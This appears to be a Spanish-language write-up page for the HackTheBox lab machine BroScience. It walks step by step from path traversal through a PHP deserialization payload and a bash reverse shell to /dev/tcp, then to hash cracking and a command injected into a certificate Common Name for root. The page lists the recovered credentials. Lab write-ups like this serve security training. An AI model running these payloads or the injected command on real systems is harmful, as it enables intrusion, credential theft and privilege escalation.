@@ -1,0 +1,487 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup BroScience HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/broscience.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup BroScience HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina BroScience de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina BroScience de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup BroScience HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup BroScience HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina BroScience de la plataforma de HackTheBox","headline":"Writeup BroScience HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup BroScience HackTheBox</h1>
+          <p>Resolución de la máquina BroScience de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.195
+Nmap scan report for 10.10.11.195
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https</span>
+</code></pre></div></div>
+
+<div><p>Al hacer un simple curl y mirar las cabeceras podemos ver el dominio broscience.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s 10.10.11.195 -I | </span><span class="s2">grep</span><span class="p"> Location
+Location: </span><span class="kd">http://broscience.htb/</span>
+</code></pre></div></div>
+
+<div><p>Fuzzeando directorios con gobuster podemos ver que existe uno llamado includes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster </span><span class="p">dir -u https://broscience.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -k
+===============================================================
+[+] Url:                     https://broscience.htb/
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 319] [--> https://broscience.htb/images/]
+</span><span class="kd">/includes</span><span class="p">             (Status: 301) [Size: 321] [--> https://broscience.htb/includes/]
+/styles               (Status: 301) [Size: 319] [--> https://broscience.htb/styles/]
+/javascript           (Status: 301) [Size: 323] [--> https://broscience.htb/javascript/]
+/manual               (Status: 301) [Size: 319] [--> https://broscience.htb/manual/]</span>
+</code></pre></div></div>
+
+<div><p>Al verlo desde el navegador podemos ver varios archivos.php entre ellos img.php</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Abriendo el img.php nos pide un argumento con el parametro path, suena a lfi</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Si le pasamos el /etc/passwd con un directory path traversal, lo detecta como ataque</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Despues de probar varias cosas, al urlencodearlo 2 veces nos muestra el contenido</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Podemos crear un script en python que automatize el doubleurlencode y la petición</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="kd">import</span><span class="p"> requests, sys, warnings
+
+warnings.simplefilter(</span><span class="s2">"ignore"</span><span class="p">)
+
+</span><span class="kd">if</span><span class="k"> len</span><span class="p">(sys.argv) </span><span class="kd"><</span><span class="na"> 2</span><span class="p">:
+    </span><span class="k">print</span><span class="p">(</span><span class="k">f</span><span class="s2">"\n\033[1;37m[\033[1;31m-\033[1;37m] Usage: python3 {sys.argv[0]} &ltfile>\n"</span><span class="p">)
+    exit(</span><span class="na">1</span><span class="p">)
+
+</span><span class="kd">def</span><span class="k"> doubleurlencode</span><span class="p">(</span><span class="no">string</span><span class="p">):
+
+    urlencode </span><span class="kd">=</span><span class="s2"> ""</span><span class="p">
+
+    </span><span class="kd">for</span><span class="p"> character </span><span class="kd">in</span><span class="p"> string:
+        decimal </span><span class="kd">=</span><span class="k"> ord</span><span class="p">(character)
+        urlencode </span><span class="kd">+=</span><span class="s2"> "%"</span><span class="kd"> + </span><span class="k">hex</span><span class="p">(decimal)[</span><span class="na">2</span><span class="p">:]
+
+    double </span><span class="kd">=</span><span class="s2"> ""</span><span class="p">
+
+    </span><span class="kd">for</span><span class="p"> character </span><span class="kd">in</span><span class="p"> urlencode:
+        decimal </span><span class="kd">=</span><span class="k"> ord</span><span class="p">(character)
+        double </span><span class="kd">+=</span><span class="s2"> "%"</span><span class="kd"> +</span><span class="k"> hex</span><span class="p">(decimal)[</span><span class="na">2</span><span class="p">:]
+
+    </span><span class="kd">return</span><span class="p"> double
+
+dpt </span><span class="kd">=</span><span class="p"> doubleurlencode(</span><span class="s2">"../../../../"</span><span class="p">)
+file </span><span class="kd">=</span><span class="p"> doubleurlencode(sys.argv[</span><span class="na">1</span><span class="p">])
+
+target </span><span class="kd">=</span><span class="s2"> "https://broscience.htb/includes/img.php?path="</span><span class="p">
+request </span><span class="kd">=</span><span class="p"> requests.get(target </span><span class="kd">+</span><span class="p"> dpt</span><span class="kd"> +</span><span class="p"> file, </span><span class="no">verify</span><span class="kd">=</span><span class="k">False</span><span class="p">)
+response </span><span class="kd">=</span><span class="p"> request.text
+
+</span><span class="k">print</span><span class="p">(response.strip())</span>
+</code></pre></div></div>
+
+<div><p>En el utils.php que habiamos visto, encontramos una funcion para activar la cuenta</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py /var/www/html/includes/utils.php | </span><span class="s2">head </span><span class="p">-n10
+&lt?php
+</span><span class="kd">function </span><span class="k">generate_activation_code</span><span class="p">() {
+    $chars </span><span class="kd">=</span><span class="s2"> "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span><span class="p">;
+    </span><span class="k">srand</span><span class="p">(</span><span class="k">time</span><span class="p">());
+    $activation_code </span><span class="kd">=</span><span class="s2"> ""</span><span class="p">;
+    </span><span class="kd">for </span><span class="p">($i </span><span class="kd">=</span><span class="na"> 0</span><span class="p">; $i </span><span class="kd"><</span><span class="na"> 32</span><span class="p">; $i</span><span class="kd">++</span><span class="p">) {
+        $activation_code </span><span class="kd">=</span><span class="p"> $activation_code </span><span class="kd">.</span><span class="p"> $chars[</span><span class="k">rand</span><span class="p">(</span><span class="na">0</span><span class="p">, </span><span class="k">strlen</span><span class="p">($chars) </span><span class="kd">-</span><span class="na"> 1</span><span class="p">)];
+    }
+    </span><span class="kd">return</span><span class="p"> $activation_code;
+}
+?></span>
+</code></pre></div></div>
+
+<div><p>En realidad deberia ser bastante facil activar nuestra cuenta, ya que la creacion de el codigo se basa en el tiempo en que se crea, entonces vamos a crear una cuenta</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Al enviar la petición interceptamos la respuesta para ver la cabecera Date</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>Creamos el codigo cambiando en el php time() por strtotime y le pasamos el Date</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+$chars </span><span class="kd">=</span><span class="s2"> "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span><span class="p">;
+</span><span class="k">srand</span><span class="p">(</span><span class="k">strtotime</span><span class="p">(</span><span class="s2">"Sun, 08 Jan 2023 19:12:29 GMT"</span><span class="p">));
+$activation_code </span><span class="kd">=</span><span class="s2"> ""</span><span class="p">;
+</span><span class="kd">for </span><span class="p">($i </span><span class="kd">=</span><span class="na"> 0</span><span class="p">; $i </span><span class="kd"><</span><span class="na"> 32</span><span class="p">; $i</span><span class="kd">++</span><span class="p">) {
+    $activation_code </span><span class="kd">=</span><span class="p"> $activation_code </span><span class="kd">.</span><span class="p"> $chars[</span><span class="k">rand</span><span class="p">(</span><span class="na">0</span><span class="p">, </span><span class="k">strlen</span><span class="p">($chars) </span><span class="kd">-</span><span class="na"> 1</span><span class="p">)];
+}
+</span><span class="kd">echo</span><span class="p"> $activation_code;
+?></span>
+</code></pre></div></div>
+
+<div><p>Ejecutandolo nos dará un codigo de activación que deberia ser válido</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ php</span><span class="p"> generate.php
+TgwM7M253W5gRUJLvLeqUItOoyTialHL</span>
+</code></pre></div></div>
+
+<div><p>Enviamos la petición a /activate.php con el codigo en el parametro code, en la respuesta podemos ver que nos dice que la cuenta se ha activado</p></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>En el utils.php tambien encontramos la funcion get_theme, dodne vemos que aprovechando que deserealiza la cookie podriamos inyectar un php y ganar acceso</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py /var/www/html/includes/utils.php | </span><span class="s2">sed</span><span class="p"> -n 63,76p
+</span><span class="kd">function </span><span class="k">get_theme</span><span class="p">() {
+    </span><span class="kd">if</span><span class="p"> (</span><span class="kd">isset</span><span class="p">($_SESSION[</span><span class="s2">'id'</span><span class="p">])) {
+        </span><span class="kd">if</span><span class="p"> (</span><span class="kd">!isset</span><span class="p">($_COOKIE[</span><span class="s2">'user-prefs'</span><span class="p">])) {
+            $up_cookie </span><span class="kd">=</span><span class="k"> base64_encode</span><span class="p">(</span><span class="k">serialize</span><span class="p">(</span><span class="no">new</span><span class="p"> UserPrefs()));
+            </span><span class="k">setcookie</span><span class="p">(</span><span class="s2">'user-prefs'</span><span class="p">, $up_cookie);
+        } </span><span class="kd">else</span><span class="p"> {
+            $up_cookie </span><span class="kd">=</span><span class="p"> $_COOKIE[</span><span class="s2">'user-prefs'</span><span class="p">];
+        }
+        $up </span><span class="kd">=</span><span class="k"> unserialize</span><span class="p">(</span><span class="k">base64_decode</span><span class="p">($up_cookie));
+        </span><span class="kd">return</span><span class="p"> $up->theme;
+    } </span><span class="kd">else</span><span class="p"> {
+        </span><span class="kd">return</span><span class="s2"> "light"</span><span class="p">;
+    }
+}</span>
+</code></pre></div></div>
+
+<div><p>Tambien encontramos las clases Avatar y AvatarInterface que guardan archivos localmente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py /var/www/html/includes/utils.php | </span><span class="s2">sed</span><span class="p"> -n 95,117p
+</span><span class="kd">class </span><span class="k">Avatar</span><span class="p"> {
+    </span><span class="kd">public </span><span class="p">$imgPath;
+
+    </span><span class="kd">public function </span><span class="k">__construct</span><span class="p">($</span><span class="no">imgPath</span><span class="p">) {
+        $this->imgPath </span><span class="kd">=</span><span class="p"> $imgPath;
+    }
+
+    </span><span class="kd">public function </span><span class="k">save</span><span class="p">($</span><span class="no">tmp</span><span class="p">) {
+        $f </span><span class="kd">=</span><span class="k"> fopen</span><span class="p">($this->imgPath, </span><span class="s2">"w"</span><span class="p">);
+        </span><span class="k">fwrite</span><span class="p">($f, </span><span class="k">file_get_contents</span><span class="p">($tmp));
+        </span><span class="k">fclose</span><span class="p">($f);
+    }
+}
+
+</span><span class="kd">class </span><span class="k">AvatarInterface</span><span class="p"> {
+    </span><span class="kd">public </span><span class="p">$tmp;
+    </span><span class="kd">public </span><span class="p">$imgPath; 
+
+    </span><span class="kd">public function</span><span class="k"> __wakeup</span><span class="p">() {
+        $a </span><span class="kd">=</span><span class="no"> new</span><span class="p"> Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}</span>
+</code></pre></div></div>
+
+<div><p>Ahora simplemente modificamos la variable tmp e imgPath para que apunte a nuestro equipo, para finalmente serializar la data, quedaria un script como el siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+</span><span class="kd">class </span><span class="k">Avatar</span><span class="p"> {
+    </span><span class="kd">public </span><span class="p">$imgPath;
+
+    </span><span class="kd">public function </span><span class="k">__construct</span><span class="p">($</span><span class="no">imgPath</span><span class="p">) {
+        $this->imgPath </span><span class="kd">=</span><span class="p"> $imgPath;
+    }
+
+    </span><span class="kd">public function </span><span class="k">save</span><span class="p">($</span><span class="no">tmp</span><span class="p">) {
+        $f </span><span class="kd">=</span><span class="k"> fopen</span><span class="p">($this->imgPath, </span><span class="s2">"w"</span><span class="p">);
+        </span><span class="k">fwrite</span><span class="p">($f, </span><span class="k">file_get_contents</span><span class="p">($tmp));
+        </span><span class="k">fclose</span><span class="p">($f);
+    }
+}
+
+</span><span class="kd">class </span><span class="k">AvatarInterface</span><span class="p"> {
+    </span><span class="kd">public </span><span class="p">$tmp </span><span class="kd">=</span><span class="s2"> "http://10.10.14.10/pwned.php"</span><span class="p">;
+    </span><span class="kd">public </span><span class="p">$imgPath </span><span class="kd">=</span><span class="s2"> "./pwned.php"</span><span class="p">;
+
+    </span><span class="kd">public function</span><span class="k"> __wakeup</span><span class="p">() {
+        $a </span><span class="kd">=</span><span class="no"> new</span><span class="p"> Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}
+
+$payload </span><span class="kd">=</span><span class="k"> base64_encode</span><span class="p">(</span><span class="k">serialize</span><span class="p">(</span><span class="no">new</span><span class="p"> AvatarInterface));
+</span><span class="kd">echo </span><span class="p">$payload;
+?></span>
+</code></pre></div></div>
+
+<div><p>Al ejecutar el php nos dará una data serializada que usaremos como cookie</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ php</span><span class="p"> serializer.php
+TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czoyODoiaHR0cDovLzEwLjEwLjE0LjEwL3B3bmVkLnBocCI7czo3OiJpbWdQYXRoIjtzOjExOiIuL3B3bmVkLnBocCI7fQ==</span>
+</code></pre></div></div>
+
+<div><p>Ahora alojaremos el pwned.php al que llamamos desde ahi, y lo compartiremos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> pwned.php
+&lt?php
+    system("bash -c 'bash -i >& /dev/tcp/10.10.14.104/443 0>&1'")
+?>
+
+</span><span class="s2">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span>
+</code></pre></div></div>
+
+<div><p>En la web donde tenemos iniciada sesión cambiamos nuestra cookie por el payload generado</p></div>
+<div><p><img src="./8.png"><p></div>
+
+<div><p>Recargamos y nos llegara una petición, indica que ha funcionado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.195 - -  "GET /pwned.php HTTP/1.0" 200 -</span>
+</code></pre></div></div>
+
+<div><p>Ahora que se ha guardado la shell, la invocamos y obtenemos www-data</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-k https://broscience.htb/pwned.php
+</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.195
+</span><span class="s2">www-data@broscience</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@broscience</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ hostname -I
+10.10.11.195 dead:beef::250:56ff:feb9:8659 
+</span><span class="s2">www-data@broscience</span><span class="p">:</span><span class="na">~/html</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Revisando de nuevo los archivos con el lfi podemos encontrar credenciales para postgresql</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">exploit.py /var/www/html/includes/db_connect.php             
+&lt?php
+$db_host </span><span class="kd">=</span><span class="s2"> "localhost"</span><span class="p">;
+$db_port </span><span class="kd">=</span><span class="s2"> "5432"</span><span class="p">;
+$db_name </span><span class="kd">=</span><span class="s2"> "broscience"</span><span class="p">;
+$db_user </span><span class="kd">=</span><span class="s2"> "dbuser"</span><span class="p">;
+$db_pass </span><span class="kd">=</span><span class="s2"> "RangeOfMotion%777"</span><span class="p">;
+$db_salt </span><span class="kd">=</span><span class="s2"> "NaCl"</span><span class="p">;
+
+$db_conn </span><span class="kd">=</span><span class="k"> pg_connect</span><span class="p">(</span><span class="s2">"host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}"</span><span class="p">);
+
+</span><span class="kd">if </span><span class="p">(</span><span class="kd">!</span><span class="p">$db_conn) {
+    </span><span class="kd">die</span><span class="p">(</span><span class="s2">"<b>Error</b>: Unable to connect to database"</span><span class="p">);
+}
+?></span>
+</code></pre></div></div>
+
+<div><p>Podemos enumerar la base de datos con psql usando las credenciales, conseguimos hashes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@broscience</span><span class="p">:</span><span class="na">~</span><span class="p">$ psql -h localhost -d broscience -U dbuser
+Password for user dbuser: </span><span class="kd">RangeOfMotion%777</span><span class="p">
+psql (13.9 (Debian 13.9-0+deb11u1))
+Type "help" for help.
+
+</span><span class="kd">broscience=></span><span class="p"> \dt
+           List of relations
+ Schema |   Name    | Type  |  Owner   
+--------+-----------+-------+----------
+ public | comments  | table | postgres
+ public | exercises | table | postgres
+ public | users     | table | postgres
+(3 rows)
+
+</span><span class="kd">broscience=></span><span class="p"> select username,password from users;
+   username    |             password             
+---------------+----------------------------------
+ administrator | 15657792073e8a843d4f91fc403454e1
+ bill          | 13edad4932da9dbb57d9cd15b66ed104
+ michael       | bd3dad50e2d578ecba87d5fa15ca5f85
+ john          | a7eed23a7be6fe0d765197b1027453fe
+ dmytro        | 5d15340bded5b9395d5d14b9c21bc82b
+(5 rows)
+
+</span><span class="kd">broscience=></span>
+</code></pre></div></div>
+
+<div><p>Podemos intentar romper los hashes pero tenemos que agregar el salt al inicio de cada linea</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat </span><span class="p">hashes
+administrator:15657792073e8a843d4f91fc403454e1
+bill:13edad4932da9dbb57d9cd15b66ed104
+michael:bd3dad50e2d578ecba87d5fa15ca5f85
+john:a7eed23a7be6fe0d765197b1027453fe
+dmytro:5d15340bded5b9395d5d14b9c21bc82b
+
+</span><span class="s2">❯ sed</span><span class="no"> 's/^/NaCl/'</span><span class="p"> /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt > newrockyou.txt
+
+</span><span class="s2">❯ john</span><span class="p"> -w:newrockyou.txt hashes --format=Raw-MD5
+Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 128/128 XOP 4x2])
+</span><span class="kd">NaCliluvhorsesandgym</span><span class="p"> (</span><span class="na">bill</span><span class="p">)
+</span><span class="kd">NaClAaronthehottest</span><span class="p"> (</span><span class="na">dmytro</span><span class="p">)
+</span><span class="kd">NaCl2applesplus2apples</span><span class="p"> (</span><span class="na">michael</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Si usamos las credenciales de bill quitandole el salt nos podemos conectar por ssh</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">bill@10.10.11.195
+bill@10.10.11.195's password: </span><span class="kd">iluvhorsesandgym</span><span class="p">
+</span><span class="s2">bill@broscience</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(bill) gid=1000(bill) groups=1000(bill)
+</span><span class="s2">bill@broscience</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.195 dead:beef::250:56ff:feb9:8659 
+</span><span class="s2">bill@broscience</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+ba2**************************81f
+</span><span class="s2">bill@broscience</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Usando pspy podemos ver que root ejecuta un script con un certificado como argumento</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt</span>
+</code></pre></div></div>
+
+<div><p>El contenido del script es el siguiente, podemos intentar ejecutar un comando en el crt</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">bill@broscience</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /opt/renew_cert.sh
+#!/bin/bash
+
+if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
+    echo "Usage: $0 certificate.crt";
+    exit 0;
+fi
+
+if [ -f $1 ]; then
+
+    openssl x509 -in $1 -noout -checkend 86400 > /dev/null
+
+    if [ $? -eq 0 ]; then
+        echo "No need to renew yet.";
+        exit 1;
+    fi
+
+    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)
+
+    country=$(echo $subject | grep -Eo 'C = .{2}')
+    state=$(echo $subject | grep -Eo 'ST = .*,')
+    locality=$(echo $subject | grep -Eo 'L = .*,')
+    organization=$(echo $subject | grep -Eo 'O = .*,')
+    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
+    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
+    emailAddress=$(openssl x509 -in $1 -noout -email)
+
+    country=${country:4}
+    state=$(echo ${state:5} | awk -F, '{print $1}')
+    locality=$(echo ${locality:3} | awk -F, '{print $1}')
+    organization=$(echo ${organization:4} | awk -F, '{print $1}')
+    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
+    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')
+
+    echo $subject;
+    echo "";
+    echo "Country     => $country";
+    echo "State       => $state";
+    echo "Locality    => $locality";
+    echo "Org Name    => $organization";
+    echo "Org Unit    => $organizationUnit";
+    echo "Common Name => $commonName";
+    echo "Email       => $emailAddress";
+
+    echo -e "\nGenerating certificate...";
+    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
+    $state
+    $locality
+    $organization
+    $organizationUnit
+    $commonName
+    $emailAddress
+    " 2>/dev/null
+
+    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
+else
+    echo "File doesn't exist"
+    exit 1;
+fi
+</span><span class="s2">bill@broscience</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Usando el comando que nos muestra el script podemos generar uno dejando todos los campos vacios pero en el Common Name ejecutar un comando</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">bill@broscience</span><span class="p">:</span><span class="na">~/Certs</span><span class="p">$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1
+Generating a RSA private key
+writing new private key to 'broscience.key'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:</span><span class="kd">$(chmod u+s /bin/bash)</span><span class="p">
+Email Address []:
+</span><span class="s2">bill@broscience</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Despues de unos segundos revisamos la bash y es suid, nos convertimos en root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">bill@broscience</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 </span><span class="kd">/bin/bash</span><span class="p">
+</span><span class="s2">bill@broscience</span><span class="p">:</span><span class="na">~</span><span class="p">$ bash -p
+bash-5.1# whoami
+root
+bash-5.1# hostname -I
+10.10.11.195 dead:beef::250:56ff:feb9:8659 
+bash-5.1# cat /root/root.txt 
+af8**************************41c
+bash-5.1#</span>
+</code></pre></div></div>
+
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
